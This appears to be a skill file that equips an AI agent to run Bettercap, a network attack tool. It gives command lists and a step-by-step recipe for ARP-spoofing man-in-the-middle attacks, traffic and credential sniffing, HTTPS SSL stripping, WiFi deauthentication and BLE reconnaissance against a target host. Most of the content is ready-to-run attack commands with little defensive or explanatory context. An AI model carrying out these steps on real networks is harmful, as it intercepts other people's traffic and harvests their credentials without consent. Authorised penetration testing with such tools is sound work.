---
name: bettercap
description: "Bettercap: Swiss Army knife for WiFi, Bluetooth, HID, and Ethernet network attacks including ARP spoofing, MITM, traffic sniffing, and credential harvesting. Use when performing LAN MITM, WiFi deauth/probe attacks, BLE reconnaissance, or HTTPS SSL stripping."
license: GPL-3.0
compatibility: "Linux / macOS. Install via package manager or Go build. Requires root/sudo."
metadata:
  author: AeonDave
  version: "1.0"
---

# Bettercap

Network attack Swiss Army knife: MITM, sniff, spoof.

## Quick Start

```bash
sudo bettercap -iface eth0
sudo bettercap -iface eth0 -caplet http-ui
```

## Core REPL Commands

| Command | Purpose |
|---------|---------|
| `net.probe on` | Discover LAN hosts |
| `net.show` | List discovered hosts |
| `arp.spoof on` | Enable ARP spoofing MITM |
| `set arp.spoof.targets <ip>` | Limit MITM to target |
| `net.sniff on` | Capture credentials/traffic |
| `https.proxy on` | HTTPS with SSL strip |
| `wifi.recon on` | WiFi AP/client discovery |
| `wifi.deauth <mac>` | Deauthenticate client |
| `ble.recon on` | BLE device scan |

## ARP MITM + credential sniff

```
sudo bettercap -iface eth0
net.probe on
set arp.spoof.duplex true
set arp.spoof.targets 192.168.1.50
arp.spoof on
net.sniff on
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Caplet examples and module reference |
